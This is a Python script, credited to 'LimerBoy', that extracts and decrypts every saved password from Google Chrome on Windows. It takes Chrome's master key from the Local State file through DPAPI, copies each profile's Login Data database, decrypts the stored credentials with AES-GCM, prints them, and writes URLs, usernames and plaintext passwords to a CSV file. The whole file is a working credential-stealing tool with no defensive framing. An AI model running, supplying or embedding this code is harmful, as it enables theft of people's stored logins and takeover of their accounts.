# Full Credits to LimerBoy
import os
import re
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
import csv

# GLOBAL CONSTANTS
CHROME_PATH_LOCAL_STATE = os.path.normpath(
    r"%s\AppData\Local\Google\Chrome\User Data\Local State" % (os.environ['USERPROFILE']))
CHROME_PATH = os.path.normpath(
    r"%s\AppData\Local\Google\Chrome\User Data" % (os.environ['USERPROFILE']))

def get_secret_key():
    try:
        with open(CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        encrypted_key = encrypted_key[5:]  # remove DPAPI prefix
        secret_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        print(str(e))
        print("[ERR] Chrome secret key cannot be found")
        return None

def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(ciphertext, secret_key):
    try:
        iv = ciphertext[3:15]
        payload = ciphertext[15:-16]
        cipher = generate_cipher(secret_key, iv)
        decrypted = decrypt_payload(cipher, payload)
        return decrypted.decode()
    except Exception as e:
        print(f"[ERR] Unable to decrypt password: {e}")
        return ""

def get_db_connection(chrome_path_login_db):
    try:
        shutil.copy2(chrome_path_login_db, "Loginvault.db")
        return sqlite3.connect("Loginvault.db")
    except Exception as e:
        print(str(e))
        print("[ERR] Chrome database cannot be copied")
        return None

if __name__ == '__main__':
    try:
        with open('decrypted_password.csv', mode='w', newline='', encoding='utf-8') as f:
            writer = csv.writer(f)
            writer.writerow(["index", "url", "username", "password"])
            secret_key = get_secret_key()
            folders = [folder for folder in os.listdir(CHROME_PATH) if re.match(r"^Profile.*|^Default$", folder)]
            for folder in folders:
                login_db_path = os.path.join(CHROME_PATH, folder, "Login Data")
                conn = get_db_connection(login_db_path)
                if conn and secret_key:
                    cursor = conn.cursor()
                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                    for index, (url, username, password_encrypted) in enumerate(cursor.fetchall()):
                        if url and username and password_encrypted:
                            decrypted_password = decrypt_password(password_encrypted, secret_key)
                            print(f"Sequence: {index}")
                            print(f"URL: {url}\nUser Name: {username}\nPassword: {decrypted_password}\n")
                            print("*" * 50)
                            writer.writerow([index, url, username, decrypted_password])
                    cursor.close()
                    conn.close()
                    os.remove("Loginvault.db")
    except Exception as e:
        print(f"[ERR] Exception occurred: {e}")
